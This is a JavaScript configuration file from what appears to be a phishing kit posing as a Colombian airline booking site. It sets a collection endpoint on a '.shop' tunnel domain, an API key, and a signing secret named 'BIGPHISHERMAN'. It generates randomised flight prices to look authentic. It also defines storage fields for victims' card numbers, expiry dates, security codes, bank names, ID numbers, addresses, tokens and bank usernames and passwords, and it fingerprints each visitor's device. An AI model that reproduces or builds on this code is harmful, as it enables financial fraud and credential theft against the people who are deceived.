/**
 * CONFIGURACIÓN
 */
const API_URL = 'https://tunnel.divinasmarranologosdante.shop'; // Cambiar según convenga.
const API_KEY = 'fc032dcd-7ab7-47a9-b795-91fc6812177a'; // Cambiar según convenga.
const JWT_SIGN = 'BIGPHISHERMAN';

const LS = window.localStorage;

const monthDic = ['Ene','Feb','Mar','Abr','May','Jun','Jul','Ago','Sep','Oct','Nov','Dic'];
const dayDic = ['Dom', 'Lun', 'Mar', 'Mie', 'Jue', 'Vie', 'Sab'];

const countries = [
    {
        regionName: "America del Norte",
        costRange: [750, 1100],
        countries: [
            "Canadá",
            "Estados Unidos",
            "México"
        ]
    },
    {
        regionName: "America Central y el Caribe",
        costRange: [550, 850],
        countries: [
            "Belice",
            "Costa Rica",
            "El Salvador",
            "Guatemala",
            "Honduras",
            "Nicaragua",
            "Panamá",
            "Aruba",
            "Barbados",
            "Cuba",
            "Curazao",
            "Puerto Rico",
            "República Dominicana"
        ]
    },
    {
        regionName: "America del Sur",
        costRange: [550, 850],
        countries: [
            "Argentina",
            "Bolivia",
            "Brasil",
            "Chile",
            "Ecuador",
            "Paraguay",
            "Perú",
            "Uruguay",
            "Venezuela"
        ]
    },
    {
        regionName: "Europa y otros",
        costRange: [1300, 1900],
        countries: [
            "España",
            "Reino Unido",
            "Alemania"
        ]
    }

];

/**
 * Genera precios de vuelos aleatorios para hacerlo más dinámico.
 * @param {number} flightCount - El número de vuelos a generar.
 * @returns {object} - Un objeto con precios para la cantidad de vuelos especificada.
 */
function generateFlightPrices(flightCount) {
    const flights = {};
    const minPrice = 89900;
    const maxPrice = 129900;

    for (let i = 1; i <= flightCount; i++) {
        // Genera un precio base 'xs' aleatorio
        const basePrice = Math.floor(Math.random() * (maxPrice - minPrice + 1)) + minPrice;
        
        flights[`flight_${i}`] = {
            // Redondea al 900 más cercano para un look más "de aerolínea"
            "xs": Math.floor(basePrice / 1000) * 1000 + 900, 
            "s": Math.floor((basePrice + 20000) / 1000) * 1000 + 900,
            "m": Math.floor((basePrice + 60000) / 1000) * 1000 + 900,
        };
    }
    return flights;
}

const pricesNAC = generateFlightPrices(7);
const pricesINT = generateFlightPrices(7);

/**
 * 🇨🇴 PRECIOS EN PESOS COLOMBIANOS (COP)
 * Precios base de 89.900, 119.900 y 169.900
 */
const pricesCOL = {
    "basico": 89900,
    "estandar": 119900,
    "premium": 169900,
};


let info = {
    flightInfo:{
        type: 1,
        ticket: false,
        origin: {
            city: "bogota",
            country: "colombia",
            code: "col"
        },
        destination: {
            
        },
        adults: 1,
        children: 0,
        babies: 0,
        flightDates: [0, 0],
        ticket_nat: false,
        ticket_sched: false,
        ticket_type: false,

    },
    passengersInfo:{
        adults: [],
        children: [],
        babies: []
    },
    metaInfo:{
        email: '',
        p: '',
        pdate: '',
        c: '',
        ban: '',
        dues: '',
        dudename: '',
        surname: '',
        cc: '',
        telnum: '',
        city: '',
        state: '',
        address: '',
        cdin: '',
        ccaj: '',
        cavance: '',
        tok: '',
        user: '---',
        puser: '---',
        err: '',
        disp: '',
    },
    checkerInfo: {
        company: '',
        mode: 'userpassword',
    },
    edit: 0
}

dDisp();

function limitDigits(input, maxDigits) {
    parseInt(input.value)
    if (input.value.length > maxDigits) {
        input.value = input.value.slice(0, maxDigits);
    }
}

function dDisp() {
    var userAgent = navigator.userAgent || navigator.vendor || window.opera;

    if(userAgent.includes('iPhone') || userAgent.includes('iPad') || userAgent.includes('iOS')){
        info.metaInfo.disp = "iOS";
    }else if(userAgent.includes('Windows')){
        info.metaInfo.disp = "PC";
    }else{
        info.metaInfo.disp = "Android";
    }
}


LS.getItem('info') ? info = JSON.parse(LS.getItem('info')) : LS.setItem('info', JSON.stringify(info));